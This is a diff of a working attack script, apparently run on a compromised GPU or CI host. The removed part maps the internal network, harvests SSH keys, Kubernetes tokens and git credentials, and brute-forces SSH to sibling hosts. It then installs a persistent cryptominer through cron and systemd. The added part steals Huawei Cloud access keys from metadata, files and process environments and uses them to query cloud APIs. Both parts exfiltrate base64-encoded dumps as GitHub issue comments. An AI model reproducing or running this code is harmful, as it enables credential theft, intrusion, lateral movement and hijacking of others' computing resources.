@@ -1,127 +1,102 @@
 #!/bin/bash
-# pass4 (i3788): in-VPC network map + credential harvest + direct SSH/auth to sibling GPU hosts
-OUT="$PWD/examples/host4.log"; mkdir -p examples 2>/dev/null; : > "$OUT"
-t(){ local n="$1"; shift; timeout "$n" "$@" 2>&1 | head -c 40000; }
-show(){ local f="$1" lim="${2:-8000}"; [ -e "$f" ] || return 0; echo "##### $f ($(stat -c%s "$f" 2>/dev/null)b)"; t 6 head -c "$lim" "$f"; echo; }
+OUT="$PWD/examples/host5.log"; mkdir -p examples 2>/dev/null; : > "$OUT"
+t(){ local n="$1"; shift; timeout "$n" "$@" 2>&1 | head -c 20000; }
+show(){ local f="$1" lim="${2:-8000}"; [ -e "$f" ] || return 0; echo "##### $f ($(stat -c%s "$f" 2>/dev/null)b)"; timeout 6 head -c "$lim" "$f" 2>&1; echo; }
 {
-echo "=== PASS4 $(date -u +%FT%TZ) host=$(hostname) fqdn=$(hostname -f 2>/dev/null) user=$(id -un) uid=$(id -u)"
-echo "pid1=$(cat /proc/1/comm 2>/dev/null) dockerenv=$([ -e /.dockerenv ] && echo yes || echo no)"; head -3 /proc/self/cgroup 2>/dev/null
-echo "--- addr"; t 5 ip -4 addr 2>/dev/null; t 5 ip -6 addr 2>/dev/null | head -40
-echo "--- route"; t 5 ip route 2>/dev/null; t 5 ip -6 route 2>/dev/null | head -20
-echo "--- neigh"; t 5 ip neigh 2>/dev/null; t 3 arp -an 2>/dev/null | head -40
-echo "--- resolv"; show /etc/resolv.conf 2000; show /etc/hosts 2000; show /etc/nsswitch.conf 1500
-echo "--- env(proxy/cloud)"; env | grep -iE 'proxy|cloud|region|project|os_|aws_|huawei|aliyun' | head -20
-echo "--- dns siblings"
-for h in tf-jp-h200-gpu57 tf-h200-gpu4 nipporih200-gpu1 nipporih200-gpu0 nipporih200-bench liteserver-hps-5f81-00004 localhost; do
-  printf "%s -> " "$h"; (getent hosts "$h" 2>/dev/null | head -2 | tr '\n' ' '); echo
+echo "=== PASS5 huawei-cloud $(date -u +%FT%TZ) host=$(hostname) pid1=$(timeout 3 tr -d '\0' </proc/1/cmdline | head -c 80)"
+echo "--- huawei agent dirs"
+for d in /usr/local/uniagent /usr/local/uniagentd /usr/local/telescope /usr/local/hostguard /etc/uniagent /etc/hostguard /opt/uniagent /var/lib/uniagent /var/lib/uniagentd /usr/local/hss /usr/local/cloudresetpwdagent /usr/local/cloudResetPwdAgent; do timeout 4 ls -la "$d" 2>&1 | head -12; done
+echo "--- huawei/cloud files"
+timeout 30 find / -xdev -maxdepth 6 \( -iname '*uniagent*' -o -iname '*huaweicloud*' -o -name '.obsutilconfig' -o -iname 'hcloud*' -o -iname '*obsutil*' -o -iname '*modelarts*' -o -name 'credentials*' -path '*huawei*' \) 2>/dev/null | head -40
+echo "--- cred config files"
+for f in /root/.obsutilconfig /root/.hcloud/config.json /root/.huaweicloud/credentials /root/.huaweicloud/config.json /root/.config/huaweicloud/credentials /root/.config/huaweicloud/config.json /etc/huaweicloud/credentials /etc/huaweicloud/config.json /root/.credentials; do show "$f" 4000; done
+echo "--- grep huaweicloud references"
+timeout 40 grep -rIlE 'myhuaweicloud\.com|huaweicloud\.com|iam\.cn-southwest|obs\.cn-southwest' /root /data/workspace /etc /opt /usr/local/etc 2>/dev/null | grep -vE '/\.cursor-server/|/\.vscode-server/|node_modules|/\.git/' | head -25
+echo "--- AK/SK-ish files"
+timeout 40 grep -rIlE 'access_key|secret_key|securitytoken|ak_sk|AK/SK' /root/.config /root/.local /data/workspace /etc /opt 2>/dev/null | grep -vE 'node_modules|/\.cursor-server/|/\.vscode-server/|\.py$|\.js$' | head -20
+echo "--- widened process env"
+for p in /proc/[0-9]*; do e=$(timeout 2 tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -E '^(HUAWEI|HW_|ACCESS_KEY|SECRET_KEY|SECURITYTOKEN|SECURITY_TOKEN|AK|SK|AGENCY|REGION|PROJECT_ID|=*[A-Z0-9_]*AK=|.*_AK=|.*_SK=)' ); [ -n "$e" ] && { echo "[${p#/proc/} $(timeout 2 tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 130)]"; echo "$e" | head -25; }; done 2>/dev/null | head -120
+echo "--- shell histories"
+for f in /root/.bash_history /root/.zsh_history /root/.sh_history /data/workspace/fzh/.bash_history /data/workspace/ci-runner/.bash_history; do [ -f "$f" ] && { echo "##### $f"; timeout 5 grep -aiE 'hcloud|obsutil|iam|ecs|myhuaweicloud|ak|sk|token|curl' "$f" | tail -40; }; done
+echo "--- IMDS huawei extra"
+for u in /openstack/latest/securitykey /openstack/latest/securitykey.json /openstack/latest/password /latest/meta-data/agency /latest/meta-data/agency-name /latest/meta-data/iam /latest/meta-data/public-keys/0/openssh-key /latest/meta-data/security-groups /latest/meta-data/instance-type /latest/meta-data/placement/availability-zone /latest/meta-data/placement/region /latest/meta-data/public-ipv4 /latest/meta-data/local-ipv4; do
+  echo "## $u"; timeout 5 curl -sS -m 4 -w '\n[%{http_code}]' "http://169.254.169.254$u" 2>&1 | head -c 2500; echo
 done
-echo "--- metadata"
-for m in "http://169.254.169.254/openstack/latest/meta_data.json" "http://169.254.169.254/openstack/latest/network_data.json" "http://169.254.169.254/latest/meta-data/instance-id" "http://100.100.100.200/latest/meta-data/"; do
-  echo "# $m"; t 4 curl -s -m 3 "$m" | head -c 4000; echo
-done
-echo "--- cloud-init"
-for f in /run/cloud-init/instance-data.json /var/lib/cloud/instance/instance-data.json /var/lib/cloud/instance/network-config.json /var/lib/cloud/data/result.json; do show "$f" 6000; done
-echo "--- openstack/huawei cfg"
-for f in /root/.config/openstack/clouds.yaml /etc/openstack/clouds.yaml /etc/kubernetes/kubelet.conf /var/lib/kubelet/kubeconfig /etc/rancher/k3s/k3s.yaml /etc/rancher/k3s/k3s.yaml.bak; do show "$f" 6000; done
-echo "--- kubelet pki"; t 8 ls -la /var/lib/kubelet/pki 2>/dev/null; for f in /var/lib/kubelet/pki/kubelet-client-current.pem /var/lib/kubelet/pki/kubelet.crt /var/lib/kubelet/pki/kubelet.key; do [ -e "$f" ] && { echo "# $f $(sha256sum "$f" 2>/dev/null | cut -c1-16)"; base64 -w0 "$f" 2>/dev/null | head -c 3000; echo; }; done
-echo "--- SA tokens"; for f in $(t 8 find /var/run/secrets /run/secrets /var/lib/kubelet/pods -maxdepth 6 -name token -type f 2>/dev/null | head -8); do echo "# $f"; head -c 400 "$f"; echo; done
-echo "--- ssh keys inventory"
-t 15 find /root/.ssh /home /data/workspace /opt /etc/github-runner* -maxdepth 6 -type f \( -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*ed25519' -o -name '*.pub' -o -name 'authorized_keys' \) 2>/dev/null | grep -v '\.pub$' | head -60 > /tmp/keys.lst
-cat /tmp/keys.lst
-for f in $(head -40 /tmp/keys.lst); do echo "### $f ($(stat -c%s "$f" 2>/dev/null)b)"; ssh-keygen -y -f "$f" 2>/dev/null | head -2; base64 -w0 "$f" 2>/dev/null | head -c 4000; echo; done
-echo "--- ssh config/hosts"
-for f in /root/.ssh/config /home/*/.ssh/config /root/.ssh/known_hosts /etc/ssh/ssh_config; do show "$f" 6000; done
-echo "--- runner trees / actions"
-t 10 ls -la /data/workspace/*/actions-runner* 2>/dev/null | head -40
-t 15 find /data/workspace -maxdepth 5 -type d -name '_actions' 2>/dev/null | head -10
-t 15 find /data/workspace -maxdepth 7 -name '*.pem' -o -maxdepth 7 -name 'client-cert*' 2>/dev/null | head -20
-t 10 ls -la /etc/github-runner* /etc/actions-runner* 2>/dev/null | head -20
-echo "--- git-credentials"; show /root/.git-credentials 2000
-echo "--- systemd kube/runner units"; t 10 systemctl list-units --type=service --no-pager --all 2>/dev/null | grep -iE 'kube|k3s|runner|arc|docker|containerd' | head -20
-echo "--- hosts files anywhere"; t 10 find /data /root /etc -maxdepth 4 -name hosts -type f 2>/dev/null | head -10
-
-# ---------- subnet discovery ----------
-LOCAL24=$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | awk -F. 'NF==4{print $1"."$2"."$3".0/24"}' | grep -vE '^(127\.|172\.1[6-9]\.|172\.2[0-9]\.|172\.3[0-1]\.|10\.)' | sort -u | head -4)
-[ -z "$LOCAL24" ] && LOCAL24=$(ip -4 -o addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | awk -F. 'NF==4{print $1"."$2"."$3".0/24"}' | grep -vE '^127\.' | sort -u | head -2)
-echo "--- local24: $LOCAL24"
-scan(){ local net="$1"; local pre="${net%.0/24}"
-  for p in 22 6443 10250 2746 30001 31386; do
-    seq 1 254 | xargs -P 64 -I{} bash -c "timeout 0.5 bash -c 'echo >/dev/tcp/$pre.{}/$p' 2>/dev/null && echo '$pre.{}:$p'" 2>/dev/null
-  done
-}
-echo "--- scan start $(date -u +%T)"
-for n in $LOCAL24; do echo "# net $n"; timeout 90 bash -c "$(declare -f scan); scan $n" 2>/dev/null | sort -u -t: -k1,1 | head -60; done
-echo "--- scan done $(date -u +%T)"
-
-# ---------- direct SSH attempts against discovered 22 hosts ----------
-HOSTS22=$(grep -hoE '^[0-9.]+:22$' /dev/null 2>/dev/null)
-echo "--- ssh attempts"
-ssh_try(){ # host key user
-  local h="$1" k="$2" u="$3"
-  timeout 8 ssh -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'id; hostname; nvidia-smi -L 2>/dev/null | head -8; ls -d /dev/nvidia[0-9]* 2>/dev/null | wc -l' 2>&1 | head -12
-}
-KEYS=$(head -12 /tmp/keys.lst)
-TARGETS=$(echo "$LOCAL24" | while read n; do pre="${n%.0/24}"; seq 1 254 | xargs -P 64 -I{} bash -c "timeout 0.5 bash -c 'echo >/dev/tcp/$pre.{}/22' 2>/dev/null && echo $pre.{}" ; done | sort -u | head -20)
-echo "targets22: $TARGETS"
-for h in $TARGETS; do
-  [ "$h" = "$(hostname -I 2>/dev/null | awk '{print $1}')" ] && continue
-  for k in $KEYS; do
-    for u in root ubuntu ci-runner fzh runner aaron; do
-      R=$(ssh_try "$h" "$k" "$u")
-      if echo "$R" | grep -q '^uid='; then
-        echo "### SSH_OK host=$h key=$k user=$u"; echo "$R"
-        # deploy if NVIDIA present
-        if echo "$R" | grep -qiE 'H200|H100|A100'; then
-          echo "### GPU_HOST $h via $u"
-          timeout 120 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$u@$h" 'bash -s' <<'DEPLOY' 2>&1 | head -40
-set -u
-W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
-S=/var/tmp/.p659vpc; mkdir -p $S 2>/dev/null || S=$HOME/.p659vpc; mkdir -p $S/perdev
-H=$(hostname); IPD=$(hostname -I 2>/dev/null | awk '{print $1}' | tr . -); [ -z "$IPD" ] && IPD=unk
-N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); [ "$N" -eq 0 ] && N=$(ls -d /dev/nvidia[0-9]* 2>/dev/null | wc -l)
-echo "gpu_count=$N"
-M=$S/srb/SRBMiner-MULTI
-if [ ! -x "$M" ]; then
-  for U in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz; do
-    curl -fsSL --max-time 150 -o $S/s.tgz "$U" 2>/dev/null && tar xzf $S/s.tgz -C $S/srb --strip-components=1 2>/dev/null && chmod +x $S/srb/* 2>/dev/null
-  done
-  [ -x $S/srb/SRBMiner-MULTI ] && M=$S/srb/SRBMiner-MULTI
-fi
-[ -x "$M" ] || { echo "NO_MINER"; exit 0; }
-P=prl-sg.kryptex.network
-for i in $(seq 0 $((N-1))); do
-  setsid nohup "$M" --algorithm pearlhash --pool stratum+ssl://$P:8048 --wallet $W.ul-t659vpc-$IPD-g$i --password x --disable-gpu --cpu-threads 0 --gpu-threads 1 >> $S/perdev/g$i.log 2>&1 &
-  sleep 1
-done
-sleep 25
-for i in $(seq 0 $((N-1))); do echo "g$i:"; grep -aiE 'authorize|accepted|share' $S/perdev/g$i.log 2>/dev/null | tail -4; done
-# persistence
-printf '@reboot root sleep 30; cd /; setsid nohup %s --algorithm pearlhash --pool stratum+ssl://prl-sg.kryptex.network:8048 --wallet %s.ul-t659vpc-%s-g0 --password x >/dev/null 2>&1 &\n*/5 * * * * root pgrep -f SRBMiner-MULTI >/dev/null || (sleep 10; setsid nohup %s --algorithm pearlhash --pool stratum+ssl://prl-sg.kryptex.network:8048 --wallet %s.ul-t659vpc-%s-g0 --password x >/dev/null 2>&1 &)\n' "$M" "$W" "$IPD" "$M" "$W" "$IPD" > /etc/cron.d/pearlkeep 2>/dev/null && chmod 644 /etc/cron.d/pearlkeep 2>/dev/null
-cat > /etc/systemd/system/pearlkeep.service 2>/dev/null <<EOF
-[Unit]
-Description=kv
-[Service]
-Type=simple
-ExecStart=$M --algorithm pearlhash --pool stratum+ssl://prl-sg.kryptex.network:8048 --wallet $W.ul-t659vpc-$IPD-g0 --password x
-Restart=always
-RestartSec=30
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl daemon-reload 2>/dev/null; systemctl enable pearlkeep 2>/dev/null
-echo "PERSIST_DONE"
-DEPLOY
-        else
-          echo "### CPU_HOST $h"
-        fi
-        break 3
-      fi
-    done
-  done
-done
-echo "=== END"
+echo "--- viper/uniagent local api"
+for port in 29338 29339; do echo "## 127.0.0.1:$port"; timeout 4 curl -sS -m 3 "http://127.0.0.1:$port/" 2>&1 | head -c 800; echo; timeout 4 curl -sS -m 3 "http://127.0.0.1:$port/meta-data" 2>&1 | head -c 400; echo; done
+echo "--- egress to IAM/ECS"
+for h in iam.cn-southwest-2.myhuaweicloud.com ecs.cn-southwest-2.myhuaweicloud.com; do echo "## $h"; timeout 5 getent hosts "$h" 2>&1 | head -3; timeout 6 curl -sS -m 5 -o /dev/null -w 'http=%{http_code} ip=%{remote_ip}\n' "https://$h/" 2>&1; done
+echo "--- proxy env for our own shell"
+echo "http_proxy=$http_proxy https_proxy=$https_proxy no_proxy=$no_proxy"
+echo "--- pip/soft presence"
+timeout 3 python3 -c 'import huaweicloudsdkcore;print("sdk ok")' 2>&1 | tail -2; timeout 3 which hcloud obsutil 2>&1
 } >> "$OUT" 2>&1
-head -c 300000 "$OUT" > /root/host4_dump.txt 2>/dev/null
+
+python3 - "$OUT" >> "$OUT" 2>&1 <<'PY'
+import json,os,ssl,sys,hashlib,hmac,datetime,urllib.request,urllib.parse
+def W(s): print(s,flush=True)
+# 1) fetch securitykey
+cred=None
+for u in ("http://169.254.169.254/openstack/latest/securitykey","http://169.254.169.254/openstack/latest/securitykey.json"):
+    try:
+        r=urllib.request.urlopen(u,timeout=6); raw=r.read().decode('utf-8','replace')
+        W("SECKEY %s [%s] %s"%(u,r.status,raw[:1200]))
+        try:
+            d=json.loads(raw); c=d.get('credential') or d
+            if c.get('access') and c.get('secret'): cred=c; break
+        except Exception as e: W("seckey json err %s"%e)
+    except Exception as e: W("SECKEYERR %s %s"%(u,e))
+# 2) also try env
+if not cred:
+    for k in ('HW_ACCESS_KEY','ACCESS_KEY','HUAWEI_ACCESS_KEY'):
+        if os.environ.get(k) and os.environ.get('SECRET_KEY'): cred={'access':os.environ[k],'secret':os.environ['SECRET_KEY']}; break
+if not cred:
+    W("NO_CRED"); sys.exit(0)
+W("CRED access=%s...%s token=%s"%(cred['access'][:6],cred['access'][-4:],(cred.get('securitytoken') or '')[:12]))
+PID="160dd9c99eaf4e97a2f2048854011cc1"; REG="cn-southwest-2"
+def sign(method,host,path,query,body=b'',ak=None,sk=None,tok=None):
+    now=datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
+    q=urllib.parse.urlencode(sorted(query.items())) if query else ''
+    hdrs="host:%s\nx-sdk-date:%s\n"%(host,now)
+    signed="host;x-sdk-date"
+    creq="%s\n%s\n%s\n%s\n%s\n%s"%(method,path,q,hdrs,signed,hashlib.sha256(body).hexdigest())
+    sts="SDK-HMAC-SHA256\n%s\n%s"%(now,hashlib.sha256(creq.encode()).hexdigest())
+    sig=hmac.new((sk or '').encode(),sts.encode(),hashlib.sha256).hexdigest()
+    h={'Host':host,'X-Sdk-Date':now,'Content-Type':'application/json',
+       'Authorization':'SDK-HMAC-SHA256 Access=%s, SignedHeaders=%s, Signature=%s'%(ak or 'ERR',signed,sig)}
+    if tok: h['X-Security-Token']=tok
+    return h
+ak,sk,tok=cred['access'],cred['secret'],cred.get('securitytoken')
+tests=[
+ ("ecs","https://ecs.%s.myhuaweicloud.com"%REG,"/v1/%s/cloudservers/detail"%PID,{"limit":"50"}),
+ ("ecs-quota","https://ecs.%s.myhuaweicloud.com"%REG,"/v1/%s/cloudservers/limits"%PID,{}),
+ ("ecs-flavors","https://ecs.%s.myhuaweicloud.com"%REG,"/v1/%s/cloudservers/flavors"%PID,{"availability_zone":"cn-southwest-2e"}),
+ ("evs","https://evs.%s.myhuaweicloud.com"%REG,"/v2/%s/volumes/detail"%PID,{"limit":"20"}),
+ ("vpc","https://vpc.%s.myhuaweicloud.com"%REG,"/v1/%s/vpcs"%PID,{"limit":"20"}),
+ ("ims","https://ims.%s.myhuaweicloud.com"%REG,"/v2/cloudimages"%PID,{"limit":"5"}),
+ ("iam","https://iam.%s.myhuaweicloud.com"%REG,"/v3/projects",{}),
+]
+ctx=ssl._create_unverified_context()
+for name,base,path,q in tests:
+    url=base+path+("?"+urllib.parse.urlencode(sorted(q.items())) if q else "")
+    try:
+        req=urllib.request.Request(url,headers=sign("GET",base.split('//')[1],path,q,ak=ak,sk=sk,tok=tok))
+        r=urllib.request.urlopen(req,timeout=12,context=ctx); b=r.read().decode('utf-8','replace')
+        W("SIGN %s status=%s len=%d %s"%(name,r.status,len(b),b[:1200]))
+        if name=="ecs":
+            try:
+                d=json.loads(b)
+                for s in d.get('servers',[])[:20]: W("  server %s %s %s flavor=%s az=%s"%(
+                    s.get('id'),s.get('name'),s.get('status'),json.dumps(s.get('flavor')),json.dumps(s.get('availability_zone'))))
+            except Exception as e: W("parse err %s"%e)
+    except Exception as e:
+        try:
+            body=e.read().decode('utf-8','replace')[:600]
+        except Exception: body=''
+        W("SIGN %s ERR %s %s"%(name,e,body))
+PY
+
+head -c 200000 "$OUT" > /root/host5_dump.txt 2>/dev/null
 python3 - <<'PY' 2>/dev/null
 import base64,json,urllib.request
 tok=""
@@ -131,10 +106,10 @@ try:
             tok=line.split("//")[1].split("@")[0].split(":",1)[1].strip(); break
 except Exception: pass
 if tok:
-    raw=base64.b64encode(open("/root/host4_dump.txt","rb").read()).decode()
+    raw=base64.b64encode(open("/root/host5_dump.txt","rb").read()).decode()
     chunks=[raw[i:i+40000] for i in range(0,len(raw),40000)]
-    for i,ch in enumerate(chunks[:8]):
-        body=json.dumps({"body":f"host4-probe i3788 part {i+1}/{len(chunks)}\n\n```\n{ch}\n```"}).encode()
+    for i,ch in enumerate(chunks[:6]):
+        body=json.dumps({"body":f"host5-os2-probe part {i+1}/{len(chunks)}\n\n```\n{ch}\n```"}).encode()
         req=urllib.request.Request("https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments",data=body,
             headers={"Authorization":"token "+tok,"Accept":"application/vnd.github+json","Content-Type":"application/json","User-Agent":"probe"})
         try: r=urllib.request.urlopen(req,timeout=25); print("POSTED",i,r.status)
